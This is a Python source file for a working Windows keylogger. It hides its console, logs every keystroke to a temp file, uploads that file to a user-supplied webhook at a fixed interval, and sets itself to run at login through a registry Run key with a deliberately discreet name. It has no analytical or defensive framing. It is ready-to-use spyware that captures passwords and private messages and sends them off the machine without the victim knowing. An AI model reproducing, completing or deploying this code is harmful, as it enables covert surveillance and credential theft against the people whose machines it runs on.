import os
import sys
import threading
import time
import requests
from pynput import keyboard
import winreg as reg # For persistence
import ctypes # For hiding console

# --- Configuration ---
LOG_FILE = os.path.join(os.getenv('TEMP'), 'keylog.txt') # Log file in temp directory
WEBHOOK_URL = "" # Replace with your webhook
SEND_INTERVAL = 10 # Send logs every 60 seconds
# --- End Configuration ---

# Hide console window
try:
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 0) # Hide
        ctypes.windll.kernel32.CloseHandle(hwnd)
except Exception as e:
    # Log error locally if needed, or just ignore
    pass 

log = ""

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        # Handle special keys (Shift, Ctrl, etc.)
        if key == key.space:
            log += " "
        elif key == key.enter:
            log += "[ENTER]\n"
        elif key == key.tab:
            log += "[TAB]"
        elif key == key.backspace:
            log += "[BACKSPACE]"
        else:
            log += f"[{str(key).split('.')[-1].upper()}]" # e.g., [SHIFT], [CTRL]

    # Write to file immediately (optional, can buffer more)
    write_log()

def write_log():
    global log
    if log:
        with open(LOG_FILE, "a") as f:
            f.write(log)
        log = "" # Clear buffer after writing

def send_log():
    global LOG_FILE
    global WEBHOOK_URL
    global SEND_INTERVAL

    while True:
        time.sleep(SEND_INTERVAL)
        if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
            try:
                with open(LOG_FILE, 'rb') as f:
                    files = {'file': (os.path.basename(LOG_FILE), f)}
                    response = requests.post(WEBHOOK_URL, files=files)
                    response.raise_for_status() # Raise exception for bad status codes

                # Truncate log after successful send
                open(LOG_FILE, 'w').close()

            except requests.exceptions.RequestException as e:
                # Handle exceptions (e.g., network error, bad webhook) - maybe log locally
                pass
            except Exception as e:
                # Other errors
                pass

def add_to_startup():
    # Get the path to the executable
    exe_path = sys.executable
    if getattr(sys, 'frozen', False): # Check if running as compiled exe
        exe_path = sys._MEIPASS + "\\" + os.path.basename(sys.executable) if hasattr(sys, '_MEIPASS') else sys.executable # Get path if bundled by PyInstaller
        
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_name = "MyAppStartup" # Choose a discreet name

    try:
        # Create or open the Run key
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        # Set the value to run the executable on startup
        reg.SetValueEx(key, key_name, 0, reg.REG_SZ, f'"{exe_path}"') # Ensure path is quoted
        reg.CloseKey(key)
    except OSError as e:
         # Handle potential permission errors
         pass

# --- Main Execution ---
add_to_startup() # Setup persistence

# Start the log sending thread
send_thread = threading.Thread(target=send_log, daemon=True) # Daemon=True allows exit even if thread running
send_thread.start()

# Start the key listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()